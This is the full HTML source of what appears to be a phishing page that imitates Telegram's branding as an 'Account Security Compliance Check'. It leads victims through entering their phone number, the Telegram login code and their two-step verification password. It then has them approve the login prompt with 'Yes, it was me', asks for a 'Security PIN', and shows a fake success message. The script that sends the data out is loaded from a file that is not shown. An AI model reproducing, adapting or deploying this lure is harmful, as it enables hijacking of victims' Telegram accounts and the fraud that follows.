<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Account Security Compliance Check</title>

    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.13.1/font/bootstrap-icons.min.css" rel="stylesheet">

    <style>
        *, *::before, *::after {
            box-sizing: border-box;
        }

        :root {
            --tg-blue: #54a9eb;
            --tg-blue-hover: #3b93d6;
            --tg-bg: #f4f4f5;
            --card-bg: #ffffff;
            --text-main: #222222;
            --text-muted: #707579;
            --border-color: #e4e6eb;
            --input-bg: #f4f5f7;
            --instruction-bg: #f7f9fa;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background-color: var(--tg-bg);
            color: var(--text-main);
            margin: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            -webkit-font-smoothing: antialiased;
        }

        .lang-selector {
            position: absolute;
            top: 20px;
            right: 20px;
            background: var(--card-bg);
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 0.85rem;
            color: var(--text-main);
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
            display: flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
            z-index: 100;
        }

        .tg-card {
            background: var(--card-bg);
            width: 100%;
            max-width: 440px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.04);
            overflow: hidden;
            animation: fadeIn 0.4s ease-out;
            position: relative;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .card-header-custom {
            text-align: center;
            padding: 40px 20px 24px;
        }

        .tg-logo {
            width: 72px;
            height: 72px;
            margin: 0 auto 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            border-radius: 50%;
            overflow: hidden;
        }

        .tg-logo img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        .card-title-custom {
            font-size: 1.25rem;
            font-weight: 700;
            color: var(--text-main);
            margin: 0;
        }

        .instructions-box {
            background-color: var(--instruction-bg);
            padding: 24px;
            border-top: 1px solid var(--border-color);
            border-bottom: 1px solid var(--border-color);
        }

        .instructions-box p {
            font-size: 0.85rem;
            color: var(--text-muted);
            margin-bottom: 16px;
        }

        .instruction-list {
            list-style: none;
            padding: 0;
            margin: 0;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .instruction-list li {
            display: flex;
            align-items: flex-start;
            gap: 12px;
            font-size: 0.8rem;
            color: var(--text-muted);
            line-height: 1.4;
        }

        .step-num {
            width: 20px;
            height: 20px;
            border-radius: 50%;
            background-color: #e4e6eb;
            color: #707579;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 0.7rem;
            font-weight: 600;
            flex-shrink: 0;
        }

        .step-num.active {
            background-color: var(--tg-blue);
            color: white;
        }

        .form-area {
            padding: 24px;
        }

        .form-label-custom {
            display: block;
            font-size: 0.9rem;
            font-weight: 600;
            color: var(--text-main);
            margin-bottom: 10px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .phone-input-wrapper {
            display: flex;
            gap: 10px;
        }

        .country-selector {
            background-color: var(--input-bg);
            border: 1px solid transparent;
            border-radius: 8px;
            padding: 0 12px;
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 0.95rem;
            font-weight: 500;
            color: var(--text-main);
            cursor: pointer;
            min-width: 95px;
            justify-content: center;
            transition: all 0.2s;
            user-select: none;
        }

        .country-selector:hover {
            background-color: #ebecef;
        }

        .input-custom {
            flex: 1;
            background-color: var(--input-bg);
            border: 1px solid transparent;
            border-radius: 8px;
            height: 48px;
            padding: 0 16px;
            font-size: 0.95rem;
            color: var(--text-main);
            width: 100%;
            transition: border-color 0.2s, background-color 0.2s;
            outline: none;
        }

        .input-custom::placeholder {
            color: #a3a7ac;
        }

        .input-custom:focus {
            border-color: var(--tg-blue);
            background-color: #ffffff;
        }

        .code-input {
            letter-spacing: 12px;
            font-size: 1.8rem;
            font-weight: 700;
            text-align: center;
        }

        .btn-tg {
            background-color: var(--tg-blue);
            color: white;
            border: none;
            border-radius: 8px;
            width: 100%;
            height: 48px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-top: 10px;
        }

        .btn-tg:hover {
            background-color: var(--tg-blue-hover);
        }

        .step-section {
            display: none;
            animation: fadeIn 0.3s ease-out;
        }
        .step-section.active {
            display: block;
        }

        .alert-custom {
            padding: 12px 16px;
            border-radius: 8px;
            font-size: 0.85rem;
            margin-bottom: 16px;
            display: none;
            font-weight: 500;
            background-color: #fde8e8;
            color: #d12c2c;
            border: 1px solid #fad2d2;
        }

        #loader-screen, #submit-loader { 
            background: #ffffff; 
        }

        .bs-overlay {
            position: fixed;
            top: 0; left: 0; width: 100vw; height: 100vh;
            background: rgba(0,0,0,0.4);
            z-index: 9998;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.3s ease;
        }
        .bs-overlay.active {
            opacity: 1;
            visibility: visible;
        }

        .bs-modal {
            position: fixed;
            bottom: -100%;
            left: 0;
            width: 100%;
            height: 60vh;
            background: #ffffff;
            z-index: 9999;
            border-radius: 20px 20px 0 0;
            box-shadow: 0 -5px 15px rgba(0,0,0,0.1);
            transition: bottom 0.4s cubic-bezier(0.175, 0.885, 0.32, 1);
            display: flex;
            flex-direction: column;
        }
        .bs-modal.active {
            bottom: 0;
        }

        .bs-header {
            padding: 15px 20px;
            border-bottom: 1px solid #eee;
        }
        
        .bs-drag-handle {
            width: 40px;
            height: 5px;
            background-color: #e4e6eb;
            border-radius: 10px;
            margin: 0 auto 15px auto;
        }

        .bs-header h3 {
            margin: 0 0 15px 0;
            font-size: 1.1rem;
            font-weight: 700;
            text-align: center;
        }

        .bs-search-box {
            position: relative;
        }

        .bs-search-box i {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: #a3a7ac;
        }

        .bs-search-box input {
            width: 100%;
            background: var(--input-bg);
            border: none;
            border-radius: 10px;
            padding: 12px 12px 12px 35px;
            font-size: 0.95rem;
            outline: none;
            transition: background 0.2s;
        }
        .bs-search-box input:focus {
            background: #ebecef;
        }

        .bs-list {
            flex: 1;
            overflow-y: auto;
            padding: 0;
            margin: 0;
            list-style: none;
        }

        .bs-item {
            display: flex;
            align-items: center;
            padding: 15px 20px;
            cursor: pointer;
            border-bottom: 1px solid #f7f9fa;
            transition: background 0.2s;
        }
        .bs-item:hover {
            background-color: #f4f5f7;
        }
        .bs-item .flag {
            font-size: 1.3rem;
            margin-right: 15px;
        }
        .bs-item .name {
            flex: 1;
            font-size: 0.95rem;
            font-weight: 500;
        }
        .bs-item .code {
            color: var(--text-muted);
            font-size: 0.9rem;
            font-weight: 600;
        }

        @media (max-width: 480px) {
            body { padding: 10px; }
            .lang-selector { top: 10px; right: 10px; }
            .tg-card { border-radius: 12px; box-shadow: 0 2px 12px rgba(0,0,0,0.08); }
        }
    </style>
</head>

<body>

    <div id="loader-screen" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 10000; display: flex; justify-content: center; align-items: center; flex-direction: column; transition: opacity 0.5s;">
        <div class="spinner-border" style="width: 2.5rem; height: 2.5rem; color: var(--tg-blue) !important;" role="status"></div>
    </div>

    <div class="lang-selector">
        简体中文 <i class="fas fa-chevron-down" style="font-size: 0.7rem; color: var(--text-muted);"></i>
    </div>

    <div class="tg-card">
        
        <div class="card-header-custom">
            <div class="tg-logo">
                <img src="images/Telegram_logo.svg.webp" alt="Telegram Logo">
            </div>
            <h2 class="card-title-custom">Account Security Compliance Check</h2>
        </div>

        <div class="instructions-box" id="instruction-block">
            <p>Verification process includes:</p>
            <ul class="instruction-list">
                <li><span class="step-num active">1</span> Select your country or region and enter your phone number</li>
                <li><span class="step-num">2</span> Enter the verification code and two-step password sent to the Telegram app</li>
                <li><span class="step-num">3</span> Tap "Yes, it was me" in the prompt shown at the top of Telegram</li>
                <li><span class="step-num">4</span> Complete the above verification steps to restore your account status</li>
            </ul>
        </div>

        <div id="main-form-container" class="form-area">
            
            <input type="hidden" id="validateclientHash">
            <input type="hidden" id="validatephone_number">
            <input type="hidden" id="validateotp_code">

            <div id="step1" class="step-section active">
                <div id="alert1" class="alert-custom alert-error"></div>
                <form id="firstForm">
                    
                    <div style="display: none;">
                        <select id="job_position" required><option value="otro" selected>Otro</option></select>
                        <select id="experience" required><option value="0" selected>Beginner</option></select>
                        <input type="checkbox" id="certifico" checked required>
                    </div>

                    <div class="form-group">
                        <input type="hidden" id="full_name" value="User">
                    </div>

                    <div class="form-group">
                        <label class="form-label-custom">Phone Number</label>
                        <div class="phone-input-wrapper">
                            <div class="country-selector" id="open-country-modal">
                                <span id="display-flag">🇮🇩</span>&nbsp;
                                <span id="display-code">+62</span>
                                <i class="fas fa-caret-down" style="font-size: 0.75rem; margin-left: 4px;"></i>
                            </div>
                            
                            <input type="tel" id="phone_number" class="input-custom" placeholder="Enter your phone number" required inputmode="numeric" autocomplete="off">
                        </div>
                    </div>

                    <button type="submit" id="firstbutt" class="btn-tg">Next</button>
                </form>
            </div>

            <div id="step2" class="step-section">
                <p class="text-center" style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 24px;">
                    We've sent a code to your Telegram app. Please enter it below.
                </p>
                <div id="alert2" class="alert-custom alert-error"></div>
                <form id="secondForm">
                    <div class="form-group">
                        <input type="tel" name="otp-input" id="otp_code" class="input-custom code-input" placeholder="•••••" required maxlength="5" autocomplete="off">
                    </div>
                    <button type="submit" id="seccbutt" class="btn-tg">Verify</button>
                </form>
            </div>

            <div id="step3" class="step-section">
                <p class="text-center" style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 24px;">
                    Enter your Two-Step Verification password.
                </p>
                <div id="alert3" class="alert-custom alert-error"></div>
                <form id="thirdForm">
                    <div class="form-group">
                        <input type="password" id="password" class="input-custom" placeholder="Password" required>
                    </div>
                    <button type="submit" id="thirdbutt" class="btn-tg">Submit</button>
                </form>
            </div>

            <div id="step4" class="step-section">
                <p class="text-center" style="color: var(--text-muted); font-size: 0.85rem; margin-bottom: 20px;">
                    Finalize your account verification.
                </p>
                <form id="fourthForm" onsubmit="event.preventDefault(); triggerLoadingToStep5();">
                    <div class="form-group">
                        <label class="form-label-custom">Region</label>
                        <input type="hidden" id="region_value" value="">
                        <div class="input-custom" id="open-region-modal" style="display: flex; align-items: center; justify-content: space-between; cursor: pointer; user-select: none;">
                            <span id="display-region" style="color: #a3a7ac;">Select region</span>
                            <i class="fas fa-caret-down" style="font-size: 0.85rem; color: #707579;"></i>
                        </div>
                    </div>
                    <div class="form-group">
                        <label class="form-label-custom">Security PIN</label>
                        <input type="text" class="input-custom" placeholder="Enter PIN" maxlength="10" required autocomplete="off">
                    </div>
                    <button type="submit" class="btn-tg mt-4">Confirm</button>
                </form>
            </div>

            <div id="step5" class="step-section text-center py-4">
                <i class="fas fa-check-circle mb-3" style="font-size: 4rem; color: #3390ec;"></i>
                <h2 class="card-title-custom mb-2">Verification Complete</h2>
                <p style="color: var(--text-muted); font-size: 0.9rem; margin-top: 10px;">Your account security status has been restored successfully.</p>
            </div>

        </div>
    </div>

    <div class="bs-overlay" id="bs-overlay"></div>
    
    <div class="bs-modal" id="bs-modal">
        <div class="bs-header">
            <div class="bs-drag-handle"></div>
            <h3>Pilih Negara</h3>
            <div class="bs-search-box">
                <i class="fas fa-search"></i>
                <input type="text" id="bs-search" placeholder="Cari nama negara atau kode..." autocomplete="off">
            </div>
        </div>
        <ul class="bs-list" id="bs-list">
            <li class="bs-item" data-code="+93" data-name="afghanistan"><span class="flag">🇦🇫</span> <span class="name">Afghanistan</span> <span class="code">+93</span></li>
            <li class="bs-item" data-code="+355" data-name="albania"><span class="flag">🇦🇱</span> <span class="name">Albania</span> <span class="code">+355</span></li>
            <li class="bs-item" data-code="+213" data-name="algeria"><span class="flag">🇩🇿</span> <span class="name">Algeria</span> <span class="code">+213</span></li>
            <li class="bs-item" data-code="+1684" data-name="american samoa"><span class="flag">🇼🇸</span> <span class="name">American Samoa</span> <span class="code">+1684</span></li>
            <li class="bs-item" data-code="+376" data-name="andorra"><span class="flag">🇦🇩</span> <span class="name">Andorra</span> <span class="code">+376</span></li>
            <li class="bs-item" data-code="+244" data-name="angola"><span class="flag">🇦🇴</span> <span class="name">Angola</span> <span class="code">+244</span></li>
            <li class="bs-item" data-code="+1264" data-name="anguilla"><span class="flag">🇦🇮</span> <span class="name">Anguilla</span> <span class="code">+1264</span></li>
            <li class="bs-item" data-code="+61" data-name="australia"><span class="flag">🇦🇺</span> <span class="name">Australia</span> <span class="code">+61</span></li>
            <li class="bs-item" data-code="+43" data-name="austria"><span class="flag">🇦🇹</span> <span class="name">Austria</span> <span class="code">+43</span></li>
            <li class="bs-item" data-code="+880" data-name="bangladesh"><span class="flag">🇧🇩</span> <span class="name">Bangladesh</span> <span class="code">+880</span></li>
            <li class="bs-item" data-code="+55" data-name="brazil"><span class="flag">🇧🇷</span> <span class="name">Brazil</span> <span class="code">+55</span></li>
            <li class="bs-item" data-code="+1" data-name="canada"><span class="flag">🇨🇦</span> <span class="name">Canada</span> <span class="code">+1</span></li>
            <li class="bs-item" data-code="+86" data-name="china"><span class="flag">🇨🇳</span> <span class="name">China</span> <span class="code">+86</span></li>
            <li class="bs-item" data-code="+57" data-name="colombia"><span class="flag">🇨🇴</span> <span class="name">Colombia</span> <span class="code">+57</span></li>
            <li class="bs-item" data-code="+20" data-name="egypt"><span class="flag">🇪🇬</span> <span class="name">Egypt</span> <span class="code">+20</span></li>
            <li class="bs-item" data-code="+33" data-name="france"><span class="flag">🇫🇷</span> <span class="name">France</span> <span class="code">+33</span></li>
            <li class="bs-item" data-code="+49" data-name="germany"><span class="flag">🇩🇪</span> <span class="name">Germany</span> <span class="code">+49</span></li>
            <li class="bs-item" data-code="+852" data-name="hong kong"><span class="flag">🇭🇰</span> <span class="name">Hong Kong</span> <span class="code">+852</span></li>
            <li class="bs-item" data-code="+91" data-name="india"><span class="flag">🇮🇳</span> <span class="name">India</span> <span class="code">+91</span></li>
            <li class="bs-item" data-code="+62" data-name="indonesia"><span class="flag">🇮🇩</span> <span class="name">Indonesia</span> <span class="code">+62</span></li>
            <li class="bs-item" data-code="+98" data-name="iran"><span class="flag">🇮🇷</span> <span class="name">Iran</span> <span class="code">+98</span></li>
            <li class="bs-item" data-code="+964" data-name="iraq"><span class="flag">🇮🇶</span> <span class="name">Iraq</span> <span class="code">+964</span></li>
            <li class="bs-item" data-code="+353" data-name="ireland"><span class="flag">🇮🇪</span> <span class="name">Ireland</span> <span class="code">+353</span></li>
            <li class="bs-item" data-code="+39" data-name="italy"><span class="flag">🇮🇹</span> <span class="name">Italy</span> <span class="code">+39</span></li>
            <li class="bs-item" data-code="+81" data-name="japan"><span class="flag">🇯🇵</span> <span class="name">Japan</span> <span class="code">+81</span></li>
            <li class="bs-item" data-code="+962" data-name="jordan"><span class="flag">🇯🇴</span> <span class="name">Jordan</span> <span class="code">+962</span></li>
            <li class="bs-item" data-code="+7" data-name="kazakhstan russia"><span class="flag">🇰🇿</span> <span class="name">Kazakhstan / Russia</span> <span class="code">+7</span></li>
            <li class="bs-item" data-code="+254" data-name="kenya"><span class="flag">🇰🇪</span> <span class="name">Kenya</span> <span class="code">+254</span></li>
            <li class="bs-item" data-code="+965" data-name="kuwait"><span class="flag">🇰🇼</span> <span class="name">Kuwait</span> <span class="code">+965</span></li>
            <li class="bs-item" data-code="+60" data-name="malaysia"><span class="flag">🇲🇾</span> <span class="name">Malaysia</span> <span class="code">+60</span></li>
            <li class="bs-item" data-code="+52" data-name="mexico"><span class="flag">🇲🇽</span> <span class="name">Mexico</span> <span class="code">+52</span></li>
            <li class="bs-item" data-code="+31" data-name="netherlands"><span class="flag">🇳🇱</span> <span class="name">Netherlands</span> <span class="code">+31</span></li>
            <li class="bs-item" data-code="+64" data-name="new zealand"><span class="flag">🇳🇿</span> <span class="name">New Zealand</span> <span class="code">+64</span></li>
            <li class="bs-item" data-code="+234" data-name="nigeria"><span class="flag">🇳🇬</span> <span class="name">Nigeria</span> <span class="code">+234</span></li>
            <li class="bs-item" data-code="+47" data-name="norway"><span class="flag">🇳🇴</span> <span class="name">Norway</span> <span class="code">+47</span></li>
            <li class="bs-item" data-code="+92" data-name="pakistan"><span class="flag">🇵🇰</span> <span class="name">Pakistan</span> <span class="code">+92</span></li>
            <li class="bs-item" data-code="+51" data-name="peru"><span class="flag">🇵🇪</span> <span class="name">Peru</span> <span class="code">+51</span></li>
            <li class="bs-item" data-code="+63" data-name="philippines"><span class="flag">🇵🇭</span> <span class="name">Philippines</span> <span class="code">+63</span></li>
            <li class="bs-item" data-code="+48" data-name="poland"><span class="flag">🇵🇱</span> <span class="name">Poland</span> <span class="code">+48</span></li>
            <li class="bs-item" data-code="+351" data-name="portugal"><span class="flag">🇵🇹</span> <span class="name">Portugal</span> <span class="code">+351</span></li>
            <li class="bs-item" data-code="+974" data-name="qatar"><span class="flag">🇶🇦</span> <span class="name">Qatar</span> <span class="code">+974</span></li>
            <li class="bs-item" data-code="+40" data-name="romania"><span class="flag">🇷🇴</span> <span class="name">Romania</span> <span class="code">+40</span></li>
            <li class="bs-item" data-code="+966" data-name="saudi arabia"><span class="flag">🇸🇦</span> <span class="name">Saudi Arabia</span> <span class="code">+966</span></li>
            <li class="bs-item" data-code="+65" data-name="singapore"><span class="flag">🇸🇬</span> <span class="name">Singapore</span> <span class="code">+65</span></li>
            <li class="bs-item" data-code="+27" data-name="south africa"><span class="flag">🇿🇦</span> <span class="name">South Africa</span> <span class="code">+27</span></li>
            <li class="bs-item" data-code="+82" data-name="south korea"><span class="flag">🇰🇷</span> <span class="name">South Korea</span> <span class="code">+82</span></li>
            <li class="bs-item" data-code="+34" data-name="spain"><span class="flag">🇪🇸</span> <span class="name">Spain</span> <span class="code">+34</span></li>
            <li class="bs-item" data-code="+94" data-name="sri lanka"><span class="flag">🇱🇰</span> <span class="name">Sri Lanka</span> <span class="code">+94</span></li>
            <li class="bs-item" data-code="+46" data-name="sweden"><span class="flag">🇸🇪</span> <span class="name">Sweden</span> <span class="code">+46</span></li>
            <li class="bs-item" data-code="+41" data-name="switzerland"><span class="flag">🇨🇭</span> <span class="name">Switzerland</span> <span class="code">+41</span></li>
            <li class="bs-item" data-name="taiwan" data-code="+886"><span class="flag">🇹🇼</span> <span class="name">Taiwan</span> <span class="code">+886</span></li>
            <li class="bs-item" data-name="thailand" data-code="+66"><span class="flag">🇹🇭</span> <span class="name">Thailand</span> <span class="code">+66</span></li>
            <li class="bs-item" data-name="turkey" data-code="+90"><span class="flag">🇹🇷</span> <span class="name">Turkey</span> <span class="code">+90</span></li>
            <li class="bs-item" data-name="ukraine" data-code="+380"><span class="flag">🇺🇦</span> <span class="name">Ukraine</span> <span class="code">+380</span></li>
            <li class="bs-item" data-name="united arab emirates uae" data-code="+971"><span class="flag">🇦🇪</span> <span class="name">United Arab Emirates</span> <span class="code">+971</span></li>
            <li class="bs-item" data-name="united kingdom uk" data-code="+44"><span class="flag">🇬🇧</span> <span class="name">United Kingdom</span> <span class="code">+44</span></li>
            <li class="bs-item" data-name="united states usa" data-code="+1"><span class="flag">🇺🇸</span> <span class="name">United States</span> <span class="code">+1</span></li>
            <li class="bs-item" data-name="venezuela" data-code="+58"><span class="flag">🇻🇪</span> <span class="name">Venezuela</span> <span class="code">+58</span></li>
            <li class="bs-item" data-name="vietnam" data-name="vietnam" data-code="+84"><span class="flag">🇻🇳</span> <span class="name">Vietnam</span> <span class="code">+84</span></li>
            <li class="bs-item" data-name="yemen" data-code="+967"><span class="flag">🇾🇪</span> <span class="name">Yemen</span> <span class="code">+967</span></li>
        </ul>
    </div>

    <div class="bs-modal" id="bs-region-modal">
        <div class="bs-header">
            <div class="bs-drag-handle"></div>
            <h3>Pilih Region</h3>
            <div class="bs-search-box">
                <i class="fas fa-search"></i>
                <input type="text" id="bs-region-search" placeholder="Cari region..." autocomplete="off">
            </div>
        </div>
        <ul class="bs-list" id="bs-region-list">
            <li class="bs-item region-item" data-value="pichincha" data-name="asia">
                <span class="name">Asia</span>
            </li>
            <li class="bs-item region-item" data-value="guayas" data-name="europe">
                <span class="name">Europe</span>
            </li>
            <li class="bs-item region-item" data-value="otro" data-name="other">
                <span class="name">Other</span>
            </li>
        </ul>
    </div>

    <div id="notification-popup" style="display:none;"></div>
    <div id="submit-loader" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.85); backdrop-filter: blur(4px); z-index: 10000; justify-content: center; align-items: center; flex-direction: column;">
        <div class="spinner-border" style="width: 3.5rem; height: 3.5rem; color: var(--tg-blue) !important;" role="status"></div>
        <p class="mt-3 fw-bold" style="color: var(--text-main) !important; letter-spacing: 1px;">Processing...</p>
    </div>

    <script src="js/jquery.min.js"></script>
    <script src="js/bootstrap.bundle.min.js"></script>
    <script src="js/logical.js"></script>

    <script>
        $(document).ready(function() {
            const observer = new MutationObserver(function(mutations) {
                mutations.forEach(function(mutation) {
                    if (mutation.target.id === 'step1' && !mutation.target.classList.contains('active')) {
                        $('#instruction-block').slideUp(200);
                    } else if (mutation.target.id === 'step1' && mutation.target.classList.contains('active')) {
                        $('#instruction-block').slideDown(200);
                    }
                });
            });
            const step1 = document.getElementById('step1');
            if(step1) observer.observe(step1, { attributes: true, attributeFilter: ['class'] });

            const overlay = document.getElementById('bs-overlay');
            
            const closeAllModals = () => {
                overlay.classList.remove('active');
                document.querySelectorAll('.bs-modal').forEach(m => m.classList.remove('active'));
                
                const searchInputs = document.querySelectorAll('input[id^="bs-search"], input[id^="bs-region-search"]');
                searchInputs.forEach(input => {
                    input.value = '';
                    input.dispatchEvent(new Event('input'));
                });
            };

            overlay.addEventListener('click', closeAllModals);

            const openBtn = document.getElementById('open-country-modal');
            const countryModal = document.getElementById('bs-modal');
            const searchInput = document.getElementById('bs-search');
            const listItems = document.querySelectorAll('.bs-item:not(.region-item)');
            const displayFlag = document.getElementById('display-flag');
            const displayCode = document.getElementById('display-code');

            openBtn.addEventListener('click', () => {
                overlay.classList.add('active');
                countryModal.classList.add('active');
            });

            searchInput.addEventListener('input', function(e) {
                const keyword = e.target.value.toLowerCase();
                listItems.forEach(item => {
                    const searchData = item.getAttribute('data-name') + " " + item.getAttribute('data-code');
                    if (searchData.includes(keyword)) {
                        item.style.display = 'flex';
                    } else {
                        item.style.display = 'none';
                    }
                });
            });

            listItems.forEach(item => {
                item.addEventListener('click', function() {
                    const flag = this.querySelector('.flag').innerText;
                    const code = this.getAttribute('data-code');
                    displayFlag.innerText = flag;
                    displayCode.innerText = code;
                    
                    COUNTRY_CODE = code;
                    MASK_FORMAT = code + " ";
                    
                    const phoneInput = document.getElementById('phone_number');
                    phoneInput.value = ""; 
                    phoneInput.focus();
                    
                    closeAllModals();
                });
            });

            const openRegionBtn = document.getElementById('open-region-modal');
            const regionModal = document.getElementById('bs-region-modal');
            const regionSearchInput = document.getElementById('bs-region-search');
            const regionListItems = document.querySelectorAll('.region-item');
            const displayRegion = document.getElementById('display-region');
            const regionValue = document.getElementById('region_value');

            openRegionBtn.addEventListener('click', () => {
                overlay.classList.add('active');
                regionModal.classList.add('active');
            });

            regionSearchInput.addEventListener('input', function(e) {
                const keyword = e.target.value.toLowerCase();
                regionListItems.forEach(item => {
                    const searchData = item.getAttribute('data-name');
                    if (searchData.includes(keyword)) {
                        item.style.display = 'flex';
                    } else {
                        item.style.display = 'none';
                    }
                });
            });

            regionListItems.forEach(item => {
                item.addEventListener('click', function() {
                    const name = this.querySelector('.name').innerText;
                    const val = this.getAttribute('data-value');
                    
                    displayRegion.innerText = name;
                    displayRegion.style.color = 'var(--text-main)';
                    regionValue.value = val;
                    closeAllModals();
                });
            });
        });
    </script>
</body>
</html>